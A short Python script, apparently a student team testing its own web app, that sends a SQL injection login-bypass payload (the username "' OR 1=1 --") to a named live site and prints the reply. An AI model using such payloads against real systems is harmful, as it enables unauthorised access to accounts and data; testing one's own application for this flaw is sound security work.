import requests

url = "https://cmsc495-group4-project.onrender.com"

payload = {
    "username": "' OR 1=1 --",
    "password": "anything"
}

res = requests.post(url, json=payload)
print(res.status_code, res.text)